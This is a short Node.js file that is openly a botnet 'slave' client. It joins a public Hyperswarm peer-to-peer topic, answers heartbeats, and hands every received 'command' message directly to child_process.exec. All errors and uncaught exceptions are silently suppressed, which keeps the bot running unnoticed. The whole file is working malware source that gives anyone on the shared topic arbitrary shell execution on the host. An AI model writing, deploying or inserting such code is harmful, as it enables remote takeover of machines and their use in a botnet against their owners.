const Hyperswarm = require('hyperswarm');
const crypto = require('crypto');
const { exec } = require('child_process');

const swarm = new Hyperswarm();
const SLAVE_TOPIC = 'hyperswarm_public_botnet_slaves';

const topicKey = crypto.createHash('sha256').update(SLAVE_TOPIC).digest();

swarm.on('connection', (socket) => {
  socket.on('close', () => {});
  socket.on('error', (err) => {});
  socket.on('data', (data) => {
    try {
      const message = JSON.parse(data.toString());
      
      if (message.type === 'heartbeat') {
        socket.write(JSON.stringify({
          type: 'heartbeat_response',
          source: 'slave'
        }));
        return;
      }

      if (message.type === 'command') exec(message.command);
      
    } catch (error) {}
  });
});

/*    ╱|、      
    (˚ˎ 。7     
     |、˜〵     
     じしˍ,)ノ  
*/

swarm.on('error', (err) => {});

swarm.join(topicKey, { server: true, client: true });

process.on('uncaughtException', (err) => {});